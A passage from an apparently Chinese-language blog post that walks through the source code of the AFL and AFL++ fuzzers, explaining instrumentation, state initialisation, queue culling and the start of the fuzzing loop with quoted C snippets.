title="afl-as.c"></a>afl-as.c</h3><p>afl-as是afl使用的汇编器，主要是用来给代码插桩。</p><p>第一个函数为<code>edit_params</code></p><blockquote><p>检查并修改参数传递给as。主要是设置as_params的值，以及use_64bit&#x2F;modified_file的值</p></blockquote><p>第二个函数为<code>add_instrumentation</code></p><blockquote><p>明确一点，插桩只在<code>.text</code>部分才会进行。插桩是为了反应程序执行状态，所以必须放在汇编<code>.text</code>部分，才能被执行，插桩才是有效的。</p><p>而这个函数主要是读取汇编程序，然后逐行分析，是否该行后是否需要插桩。而插桩的条件十分简单粗暴</p></blockquote><p>插桩的条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">^func:- 函数入口点<br>^.L0:- GCC 的分支标签<br>^.LBB0_0:- calng 的分支标签<br>^\tjnz foo- 条件分支语句，例如循环，判断语句等<br></code></pre></td></tr></table></figure><blockquote><p>通过判断汇编的前导符号&#x2F;标签来判断这是否是一个分支或者函数，然后插入instrumentation trampoline.</p></blockquote><p><code>main</code>函数</p><blockquote><p>设置inst_ratio_str，控制插桩密度等</p><p>主要作用是设置各种环境变量</p></blockquote><h3 id="afl-clang-fast-c"><a href="#afl-clang-fast-c" class="headerlink" title="afl-clang-fast.c"></a>afl-clang-fast.c</h3><p>afl-clang-fast.c其实就是clang的一层封装(wrapper)，与之前的afl-gcc一样，指示定义了一些宏，传递了一些参数给真正的clang而已。</p><p>因为AFL对于之前afl-gcc的插桩做法不建议，并提供了更好的工具afl-clang-fast，通过llvm pass来插桩。</p><p>第一个函数<code>find_obj</code></p><blockquote><p>主要是调用afl-clang-fast，三种方式：</p><ul><li>获取环境变量AFL_PATH的值，如果存在则读取AFL_PATH&#x2F;afl-llvm-rt.o，如果可以访问该文件则设置该目录为obj_path</li><li>如果没有环境变量，则检查arg0是否存在<code>/</code>，因为通过终端形式调用afl-clang-fast也很常见。读取该目录下afl-llvm-rt.o文件，此时认为最后一个&#x2F;之前的目录为obj_path。</li><li>默认的AFL的MakeFile在编译时会定义一个名为AFL_PATH的宏，其指向&#x2F;usr&#x2F;local&#x2F;lib&#x2F;afl，则在此处寻找afl-llvm-rt.o文件，如果能够访问，同理设置obj_path。</li></ul><p>三种方式行不通，则抛出异常<code>Unable to find &#39;afl-llvm-rt.o&#39; or &#39;afl-llvm-pass.so&#39;. Please set AFL_PATH</code></p></blockquote><p>第二个函数<code>edit_params</code></p><blockquote><p>根据环境变量，用户指定参数来设置参数、宏等。</p></blockquote><p><code>main</code>函数</p><p>寻找obj_path路径</p><p>编辑cc_params参数：选择clang,clang++等</p><h1 id="AFL-1"><a href="#AFL-1" class="headerlink" title="AFL++"></a>AFL++</h1><h2 id="CmpLog"><a href="#CmpLog" class="headerlink" title="CmpLog"></a>CmpLog</h2><p>To Finish… </p><h2 id="记一次Fuzzing-使用ShapFuzz-Debug"><a href="#记一次Fuzzing-使用ShapFuzz-Debug" class="headerlink" title="记一次Fuzzing(使用ShapFuzz) - Debug"></a>记一次Fuzzing(使用ShapFuzz) - Debug</h2><p>一次完整的Fuzzing过程，从main函数处打断点。执行记录如下</p><p>调用afl-common.c文件中的get_map_size()</p><blockquote><p>这个函数通过获取环境变量中的”AFL_MAP_SIZE”和”AFL_MAPSIZE”的值并将其返回。本次运行时，map_size的值为<code>0x800000</code></p></blockquote><p>调用完成，回到主函数，继续获取环境变量中的”AFL_NO_COLOR”和”AFL_NO_COLOUR”</p><blockquote><p>switch colored console output off    关闭彩色控制台输出。</p></blockquote><p>随后调用afl-common.c文件中的argv_cpy_dup(argc,argv_orig);用一个char **ret存储了所有的argv。最后返回ret。</p><p>使用<code>calloc</code>给<code>afl_state_t</code>类型的变量指针变量*afl开辟空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//指针afl指向一个afl_state_t的内存块，该内存块大小为sizeof(afl_state_t)</span><br><span class="hljs-type">afl_state_t</span> *afl = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">afl_state_t</span>));<br></code></pre></td></tr></table></figure><p>随后调用函数afl-common.c文件中的<code>get_afl_env()</code>来判断”AFL_DEBUG”环境变量是否被设置，若被设置，那么<code>debug=afl-&gt;debug=1</code>。</p><p>随后调用afl-fuzz-state.c文件中的<code>afl_state_init(afl,map_size)</code>对afl_state_t这个结构体进行初始化。</p><blockquote><p>先执行<code>memset(afl, 0, sizeof(afl_state_t));</code>对afl指向的地址块赋0；</p><p><code>afl-&gt;shm.map_size = map_size?map_size:MAP_SIZE</code>对结构体的shm.map_size进行赋值操作。选取map_size和全局变量MAP_SIZE中较大的那个。</p><p><code>afl-&gt;w_init=0.9;afl-&gt;w_end=0.3;afl-&gt;g_max=5000;afl-&gt;period_pilot_tmp=5000.0</code>初始化这些变量，现在还不知道它们干嘛的。</p><p><code>afl-&gt;schedule = FAST;</code>能量调度方式，默认为FAST</p><p><code>afl-&gt;havoc_max_mult = HAVOC_MAX_MULT;</code>havoc变异时，每个字节的最大修改次数。</p><p>剩余的初始化代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;clear_screen = <span class="hljs-number">1</span>;                <span class="hljs-comment">/* Window resized?                  */</span><br>afl-&gt;havoc_div = <span class="hljs-number">1</span>;                   <span class="hljs-comment">/* Cycle count divisor for havoc    */</span><br>afl-&gt;stage_name = <span class="hljs-string">&quot;init&quot;</span>;             <span class="hljs-comment">/* Name of the current fuzz stage   */</span><br>afl-&gt;splicing_with = <span class="hljs-number">-1</span>;              <span class="hljs-comment">/* Splicing with which test case?   */</span><br>afl-&gt;cpu_to_bind = <span class="hljs-number">-1</span>;<br>afl-&gt;havoc_stack_pow2 = HAVOC_STACK_POW2; <span class="hljs-comment">//控制havoc变异策略用于存储变异操作的栈的大小。</span><br>afl-&gt;hang_tmout = EXEC_TIMEOUT;<br>afl-&gt;exit_on_time = <span class="hljs-number">0</span>;<br>afl-&gt;stats_update_freq = <span class="hljs-number">1</span>;<br>afl-&gt;stats_avg_exec = <span class="hljs-number">0</span>;<br>afl-&gt;skip_deterministic = <span class="hljs-number">1</span>;<br>afl-&gt;cmplog_lvl = <span class="hljs-number">2</span>;<br>afl-&gt;min_length = <span class="hljs-number">1</span>;<br>afl-&gt;max_length = MAX_FILE;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NO_SPLICING</span><br>afl-&gt;use_splicing = <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>afl-&gt;q_testcase_max_cache_size = TESTCASE_CACHE_SIZE * <span class="hljs-number">1048576UL</span>;<br>afl-&gt;q_testcase_max_cache_entries = <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>;<br><br></code></pre></td></tr></table></figure><p><code>HAVOC_STACK_POW2</code>：havoc变异策略会对输入数据进行一系列的随机修改，以生成新的测试用例。为了提高效率，AFL++会在havoc过程中维护一个栈，用于存储一系列的变异操作。而HAVOC_STACK_POW2可控制着这个栈的大小，这个栈的大小决定了AFL++在一次havoc变异过程中可以执行的变异操作的最大数量。</p><p><code>TESTCASE_CACHE_SIZE</code>:AFL++中用于控制测试用例缓存大小的环境变量。AFL++使用了一个缓存来存储已经执行过的测试用例，以便在下次执行时快速检索，避免重复执行。默认值是8MB。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;virgin_bits = ck_alloc(map_size);<br>afl-&gt;virgin_tmout = ck_alloc(map_size);<br>afl-&gt;virgin_crash = ck_alloc(map_size);<br>afl-&gt;var_bytes = ck_alloc(map_size);<span class="hljs-comment">// 存储在fuzzing过程中用到的变异字节数据，一个u8类型数组的指针。</span><br>afl-&gt;top_rated = ck_alloc(map_size * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span> *)); <span class="hljs-comment">// 存储经过排序的测试用例的指针</span><br>afl-&gt;clean_trace = ck_alloc(map_size);<br>afl-&gt;clean_trace_custom = ck_alloc(map_size);<br>afl-&gt;first_trace = ck_alloc(map_size);<br>afl-&gt;map_tmp_buf = ck_alloc(map_size);<br><br>afl-&gt;fsrv.use_stdin = <span class="hljs-number">1</span>;<br>afl-&gt;fsrv.map_size = map_size;<br><span class="hljs-comment">// afl_state_t is not available in forkserver.c</span><br>afl-&gt;fsrv.afl_ptr = (<span class="hljs-type">void</span> *)afl;<br>afl-&gt;fsrv.add_extra_func = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span> *, u8 *, u32)) &amp; add_extra;<br>afl-&gt;fsrv.exec_tmout = EXEC_TIMEOUT;<br>afl-&gt;fsrv.mem_limit = MEM_LIMIT;<br>afl-&gt;fsrv.dev_urandom_fd = <span class="hljs-number">-1</span>;<br>afl-&gt;fsrv.dev_null_fd = <span class="hljs-number">-1</span>;<br>afl-&gt;fsrv.child_pid = <span class="hljs-number">-1</span>;<br>afl-&gt;fsrv.out_dir_fd = <span class="hljs-number">-1</span>;<br></code></pre></td></tr></table></figure><p>virgin_bits，virgin_tmout,virgin_crash分别是初始状态下，目标程序执行过程中覆盖的代码分支，目标程序的执行时间和目标程序是否崩溃。</p><p><code>afl-&gt;fsrv_t</code>结构体，用于管理AFL++的Fork Server。</p><p><code>fsrv_t</code> 结构体包含了 Fork Server 的各种配置和状态信息，包括：</p><ul><li><strong><code>use_stdin</code>:</strong>  表示是否使用标准输入 (stdin) 来接收测试用例，默认为 1。</li><li><strong><code>map_size</code>:</strong> 表示用于存储执行路径信息的映射表的大小。</li><li><strong><code>afl_ptr</code>:</strong> 指向 <code>afl_state_t</code> 结构体的指针，用于在 Fork Server 中访问 <code>afl_state_t</code> 结构体中的信息。</li><li><strong><code>add_extra_func</code>:</strong> 指向一个函数指针，用于添加额外的测试用例。</li><li><strong><code>exec_tmout</code>:</strong> 表示每个测试用例的执行超时时间。</li><li><strong><code>mem_limit</code>:</strong> 表示目标程序的内存使用限制。</li><li><strong><code>dev_urandom_fd</code>:</strong>  表示随机数设备文件的描述符。</li><li><strong><code>dev_null_fd</code>:</strong>  表示空设备文件的描述符。</li><li><strong><code>child_pid</code>:</strong>  表示子进程的进程 ID。</li><li><strong><code>out_dir_fd</code>:</strong>  表示输出目录的文件描述符。</li></ul></blockquote><p>随后会调用<code>read_afl_environment()</code>函数，根据诸多环境对afl_state_t这个结构体进行初始化赋值。</p><p>doc_path被初始化为：<code>$(PREFIX)/share/doc/afl</code>。然后调用<code>gettimeofday(&amp;tv,&amp;tz)</code>获取当前时间，并存入<code>tv</code>和<code>tz</code>两个结构体中。</p><p>执行<code>rand_set_seed(afl, tv.tv_sec ^ tv.tv_usec ^ getpid());</code>该函数在afl-performance.c文件。基于时间生成随机数，存于<code>afl-&gt;init_seed,afl-&gt;rand_seed[0,1,2]</code>中。</p><p>再设置<code>afl-&gt;shmem_testcase_mode</code>为1，默认使用共享内存来传递测试用例。</p><p>随后是一个循环，调用getopt函数解析命令行参数，并根据参数设置相应的配置选项。</p><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<br>(opt = getopt(<br>  argc, argv,<br>  <span class="hljs-string">&quot;+Ab:B:c:CdDe:E:hi:I:f:F:g:G:l:L:m:M:nNOo:p:RQs:S:t:T:UV:WXx:YZwku&quot;</span>)) &gt;<br>      <span class="hljs-number">0</span>) &#123;<br></code></pre></td></tr></table></figure><p><code>&quot;+Ab:B:c:CdDe:E:hi:I:f:F:g:G:l:L:m:M:nNOo:p:RQs:S:t:T:UV:WXx:YZwku&quot;</code>字符串用于指定命令行参数的选项和参数类型。getopt函数每次调用都会解析下一个命令行参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;in_dir <span class="hljs-comment">// 种子池</span><br>afl-&gt;out_dir <span class="hljs-comment">// 输出文件夹</span><br>afl-&gt;fixed_seed <span class="hljs-comment">// 默认值为0，即AFL++使用随机种子，每次运行fuzzing时，都会产生不同的变异序列。为1时，AFL++使用固定的种子，每次运行fuzzing时都会产生相同的变异序列。</span><br>afl-&gt;fsrv.mem_limit <span class="hljs-comment">//为0取消内存限制，其余值即限制内存大小（单位为字节）</span><br></code></pre></td></tr></table></figure></blockquote><p>跳出循环后，使用unlikely判断<code>afl-&gt;afl_env.afl_persistent_record</code>是否为空指针。若不为空则FATAL错误。</p><blockquote><p>afl_persistent_record指针指向<code>afl_persistent_record_t</code>结构体，通过这个指针，AFL++可以访问和更新持久化数据，持久化的意思是，下次启动AFL++能继续使用。此外，通过这个指针还能恢复执行状态，记录Crash等。</p></blockquote><p>随后调用函数<code>parse_afl_kill_signal_env()</code>函数用来分析终止信号环境变量，FATALs和ERROR等，如果未设置env,则将信号处理程序的env设置未default。并返回default_signal。</p><blockquote><p>终止进程，当AFL++主进程需要终止process时，它会向fsrv模块发送终止命令，fsrv会使用kill_signal中存储的信号值来终止相应的process。</p></blockquote><p>执行<code>setup_signal_handlers()</code>函数，也就是信号处理函数，保证了AFL++能够对各种信号进行适当的处理。执行<code>check_asan_opts()</code>函数，设置内存检测工具ASAN。设置<code>afl-&gt;power_name</code>为FAST（默认）。随后同步模式运行AFL++，将<code>auto_sync</code>设置为1，设置<code>afl-&gt;sync_id</code>为default，表示这是一个自动配置的同步示例。<code>afl-&gt;is_secondary_node=1</code>表示这是一个次级节点，用于接收来自主节点的同步信息。</p><p>判断是否禁用测试用例的“修剪功能”，即<code>afl-&gt;disable_trim=1</code>禁用。</p><blockquote><p>测试用例修剪：在AFL++中，测试用例修剪是指通过分析测试用例的执行过程，移除那些对代码覆盖率没有影响的部分，从而所见测试用例的大小，提高模糊测试的效率。当afl-&gt;disable_trim&#x3D;1是，表示禁用修剪功能，AFL++不会对测试用例进行修剪，而是使用完整的测试用例进行模糊测试。</p></blockquote><p>若<code>afl-&gt;afl_env.afl_statsd</code>不为空，则调用<code>statsd_setup_format(afl)</code>函数。</p><blockquote><p><code>afl-&gt;afl_env.afl_statsd</code>是AFLpp中用来配置StatsD统计数据发送的变量，用户可以将AFL++的统计数据发送到StatsD服务器，方便监控和分析模糊测试过程，提高模糊测试效率。</p><p>而statsd_setup_format()函数根据<code>AFL_STATSD_TAGS_FLAVOR</code>环境变量的标签类型，选择相应的格式，以便AFL++可以将统计数据以正确的格式发送到StatsD服务器。格式有：<code>dogstatsd</code>，<code>librato</code>，<code>influxdb</code>，<code>signalfx</code>等。</p></blockquote><p><code>afl-&gt;use_banner</code>值默认为True，控制着是否在启动时显示欢迎信息。</p><p>随后判断是否为AFLFast~RARE模式之间，是的话，对<code>afl-&gt;n_fuzz</code>进行开辟空间。</p><p>随后，又是一波环境变量初始化操作。接下来是判断是否启用自动恢复功能，自动恢复功能是指当AFL++进程意外终止时，它会尝试恢复之前的运行状态，例如恢复测试用例队列、代码覆盖率信息以及其他相关数据。当<code>afl-&gt;afl_env.afl_autoresume</code>为true时，启用自动恢复功能。</p><p>然后也是一系列的初始化值，初始化时都默认为0所以都跳过了。</p><blockquote><p><code>afl-&gt;afl_env.afl_max_det_extras</code>用来控制AFL++在执行确定性模糊测试时，最多生成多少个额外的测试用例。AFL++可以执行两种类型的模糊测试：随机模糊测试和确定性模糊测试。确定性模糊测试会系统地尝试所有可能的变异操作，以确保覆盖所有可能的输入数据。额外的测试用例是指在执行确定性模糊测试时，除了初始的测试用例之外，还会生成一些额外的测试用例，用于覆盖一些特殊的输入情况。</p><p>如果没设置这个变量的话，那么会默认为256个。</p></blockquote><p>由于进行基本的Fuzzing，那么初始化时<code>afl-&gt;afl_env</code>的成员变量全被赋值为0，因此大部分初始化操作都会跳过。 执行到生成fuzz data时，需要开辟缓存空间。使用AFL_BUF_PARAM宏定义，用于定义测试用例缓冲区大小。<code>afl_realloc(AFL_BUF_PARAM(in_scratch), min_alloc);</code>这个语句的作用是使用afl_realloc()函数，为in_scratch指向的测试用例缓冲区重新分配内存，分配的内存大小为min_alloc。</p><p>后续也是一系列初始化行动。执行至<code>setup_custom_mutators()</code>，该函数负责从用户指定的库文件或命令行参数中加载自定义变异器，并将它们添加到AFL++的变异器列表中。随后的<code>write_setup_file()</code>通过将当前模糊测试的环境变量和命令行参数写入fuzzer_setup文件，记录当前模糊测试的配置信息。<code>fuzzer_cmdline()</code>函数是将当前命令行参数写入文件中。<code>read_testcases()</code>函数用于从输入目录读取所有测试用例，并将它们排队等待测试。<code>pivot_inputs()</code>函数的主要作用是为输入测试用例创建硬链接，并根据需要调整文件名。</p><p>随后的<code>if (!afl-&gt;fsrv.out_file) </code>语句内容，是在命令行参数中查找包含”@@”的参数，并根据需要设置输出文件路径。<code>check_binary(afl, argv[optind]);</code>这个函数的主要目的是确保目标二进制文件存在且可执行，并且在某些模式下跳过进一步的检查。<code>  setup_testcase_shmem(afl)</code>函数是为AFL++配置共享内存，以便在模糊测试过程中使用共享内存来存储和传递测试用例数据。</p><p>跳过一些初始化空间以及为一些模式做初始化的操作后（本次测试并未启用任何其他模式）</p><p>后续检查共享内存的大小，如果小于等于全局变量<code>DEFAULT_SHMEM_SIZE</code>，将其设置为共享内存大小，并将其值存储在环境变量<code>AFL_MAP_SIZE</code>中。<code>load_auto(afl)</code>用于加载字典。<code>deunicode_extras()</code>函数旨在处理额外数据。（此次运行并没有额外数据）</p><p><code>afl-&gt;in_bitmap</code>记录已经测试过的输入数据的特征信息，其实际也是一个位图，每个位代表一个特定的输入特征。当AFL++测试一个新的输入数据时，会根据该输入数据计算出一些特征信息，并将对应的位图设置为1，表示该特征已经被测试过。AFL++能够根据<code>afl-&gt;in_bitmap</code>来判断新的输入数据是否已经测试过，避免重复测试或类似的输入数据，从而提高测试效率。</p><p>而<code>afl-&gt;virgin_bits</code>是一个用来记录程序尚未覆盖的执行路径的位图。它是一个字节数组，每个字节代表8个不同的执行路径分支。当AFL++执行一个测试用例时，它会根据程序执行的路径更新<code>afl-&gt;virgin_bits</code>，将对应路径的位设置为0，表示该路径已经被覆盖。初始化时，其被设置为255。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">perform_dry_run(afl);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">函数首先遍历afl数据结构中的所有队列项，对于每一项检查该项是否被有效且未被禁用。如果该项有效，尝试打开与测试用例关联的文件并将其内容读入内存。然后关闭文件，使用`calibrate_case`函数校准测试用例。</span><br><span class="hljs-comment">通过dry_run，确保所有初始测试用例都已正确处理，并为后续的fuzzing做好准备。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>随后，为缓存数组<code>afl-&gt;q_testcase_cache</code>分配一个大小为<code>afl-&gt;q_testcase_max_cache_entries</code>的内存块。</p><p>执行<code>cull_queue</code>函数通过标记和优化队列中的测试用例，确保在模糊测试过程中优先处理那些对覆盖率有贡献的测试用例。</p><blockquote><p>cull_queue首先检查<code>afl-&gt;score_changed</code>是否为0，如果为0 则直接返回，表明未发生改变。否则，执行cull_queue，首先初始化变量，重置所有队列项的favored标志：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; afl-&gt;queued_itedms; i++)&#123;<br>afl-&gt;queue_buf[i]-&gt;favored = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>标记新的favored条目：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">遍历afl-&gt;fsrv.map_size中的每个字节。如果afl-&gt;top_rated[i]存在且temp_v中对应的位被设置，则将afl-&gt;top_rated[i]标记为favored，并更新temp_v，移除当前条目对应的所有位。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; afl-&gt;fsrv.map_size; ++i)&#123;<br><span class="hljs-keyword">if</span> (afl-&gt;top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="hljs-number">3</span>] &amp; (<span class="hljs-number">1</span> &lt;&lt; (i &amp; <span class="hljs-number">7</span>)))) &#123;<br>u32 j = len;<br><span class="hljs-keyword">while</span> (j--) &#123;<br><span class="hljs-keyword">if</span> (afl-&gt;top_rated[i]-&gt;trace_mini[j]) &#123;<br>temp_v[j] &amp;= ~afl-&gt;top_rated[i]-&gt;trace_mini[j];<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!afl-&gt;top_rated[i]-&gt;favored) &#123;<br>afl-&gt;top_rated[i]-&gt;favored = <span class="hljs-number">1</span>;<br>++afl-&gt;queued_favored;<br><span class="hljs-keyword">if</span> (!afl-&gt;top_rated[i]-&gt;was_fuzzed) &#123; ++afl-&gt;pending_favored; &#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>标记冗余条目：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; afl-&gt;queued_items; i++) &#123;<br><span class="hljs-keyword">if</span> (likely(!afl-&gt;queue_buf[i]-&gt;disabled)) &#123;<br>mark_as_redundant(afl, afl-&gt;queue_buf[i], !afl-&gt;queue_buf[i]-&gt;favored);<br>&#125;<br>&#125;<br><span class="hljs-comment">// 遍历所有队列项，如果队列项未被禁用，则调用mark_as_redundant()函数，将其标记为冗余或者非冗余，具体取决于其favored标志。</span><br></code></pre></td></tr></table></figure></blockquote><p>随后循环queue_buf，确保存在一个合法(没有被禁用)种子。</p><p>函数<code>show_init_stat</code>主要目的是在AFL++ 处理输入目录后，显示一些统计信息和警告，调整一些参数以优化模糊测试执行。接下来是判断是否有上一次种子的选择。此次执行为全新执行，因此无。且后续判断是否为恢复执行，也无。</p><p>随后会记录状态，执行函数<code>write_stats_file</code>，更新统计文件。它记录了各种运行时的统计数据，包括执行次数，覆盖率，稳定性等。并在调试模式下记录额外的信息。</p><p>执行函数<code>maybe_update_plot_file</code>，更新AFL的plot file，记录各种统计数据。包括相对时间、周期数、当前条目、队列项数、未模糊测试的项数、保存的Crashes、保存的挂起数、最大深度、每秒执行次数等。</p><p>随后调用函数<code>save_auto</code>，这个函数保存自动生成的额外输入。本次执行无额外输入，即进入函数则返回。</p><p>随后进入Fuzzing的主体循环。<code>while(likely(!afl-&gt;stop_soon))</code>，likely是一个宏，用于优化代码的执行效率，它告诉编译器，循环条件很有可能为true。编译器会根据这个提示对代码进行优化。</p><blockquote><p><code>afl-&gt;stop_soon</code>是AFL++中用于控制模糊测试过程是否停止的标志位。允许用户根据需要手动停止模糊测试，或设置时间限制和目标漏洞等条件，从而更有效地进行模糊测试。</p></blockquote><p>循环第一行执行一个<code>cull_queue(afl)</code>。第一次循环，<code>afl-&gt;score_changed</code>依然为1，因此不执行cull_queue主体。直接返回。</p><p>接下来是<code>if (unlikely((!afl-&gt;old_seed_selection &amp;&amp; runs_in_current_cycle &gt; afl-&gt;queued_items) || (afl-&gt;old_seed_selection &amp;&amp; !afl-&gt;queue_cur)))</code>一个判断，</p><blockquote><p>条件<code>!afl-&gt;old_seed_selection &amp;&amp; runs_in_current_cycle &gt; afl-&gt;queued_items</code>：如果没有使用旧的种子选择策略，并且当前循环中的运行周期超过了队列中的种子数量。则进入执行体。</p><p>条件<code>afl-&gt;old_seed_selection &amp;&amp; !afl-&gt;queue_cur</code>：如果使用了旧的种子选择策略，并且当前队列指针为空的话，那么进入执行体。</p><p>unlikely说明这个条件很少为真。</p></blockquote><p>本次执行，第一个条件为真，进入执行体。</p><p>紧接着是第二个if语句。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 第一个条件afl-&gt;last_sync_cycle &lt; afl-&gt;queue_cycle:如果上次同步周期小于当前队列周期 !afl-&gt;queue_cycle &amp;&amp; afl-&gt;afl_env.afl_import_first:如果当前队列周期为0，并且环境变量afl_import_first被设置。两个条件都被满足即进入执行体。</span><br><span class="hljs-comment">// 第二个条件 afl-&gt;sync_id:同步id是否存在。</span><br><span class="hljs-keyword">if</span> (unlikely((afl-&gt;last_sync_cycle &lt; afl-&gt;queue_cycle ||<br>                (!afl-&gt;queue_cycle &amp;&amp; afl-&gt;afl_env.afl_import_first)) &amp;&amp;<br>               afl-&gt;sync_id)) &#123;<br>    sync_fuzzers(afl);<br>&#125;<br><span class="hljs-comment">// 这个同步id应该是多个afl++进程被执行时需要同步。</span><br><span class="hljs-comment">// 本次执行只有一个afl++主体， 因此不用执行。</span><br><span class="hljs-comment">// sync_fuzzers(afl)是用来同步fuzzers的函数</span><br></code></pre></td></tr></table></figure><p>进入后续if执行体，紧接着是几个赋值语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 更新队列周期和重置变量</span><br>++afl-&gt;queue_cycle;<br>runs_in_current_cycle = (u32)<span class="hljs-number">-1</span>;<br>afl-&gt;cur_skipped_items = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>随后是一个if语句处理旧的种子选择策略。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-keyword">if</span> (unlikely(afl-&gt;old_seed_selection)) &#123;<br>        afl-&gt;current_entry = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (unlikely(afl-&gt;current_entry &lt; afl-&gt;queued_items &amp;&amp;<br>                        afl-&gt;queue_buf[afl-&gt;current_entry]-&gt;disabled)) &#123;<br>          ++afl-&gt;current_entry;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (afl-&gt;current_entry &gt;= afl-&gt;queued_items) &#123; afl-&gt;current_entry = <span class="hljs-number">0</span>; &#125;<br>        afl-&gt;queue_cur = afl-&gt;queue_buf[afl-&gt;current_entry];<br>        <span class="hljs-keyword">if</span> (unlikely(seek_to)) &#123;<br>          <span class="hljs-keyword">if</span> (unlikely(seek_to &gt;= afl-&gt;queued_items)) &#123;<br>            <span class="hljs-comment">// This should never happen.</span><br>            FATAL(<span class="hljs-string">&quot;BUG: seek_to location out of bounds!\n&quot;</span>);<br>          &#125;<br>          afl-&gt;current_entry = seek_to;<br>          afl-&gt;queue_cur = afl-&gt;queue_buf[seek_to];<br>          seek_to = <span class="hljs-number">0</span>;<br>        &#125;<br>      &#125;<br><span class="hljs-comment">//主要是更新`current_entry`和`queue_cur`</span><br></code></pre></td></tr></table></figure><p>接下来是一个if语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(afl-&gt;not_on_tty)) &#123;<br><br>  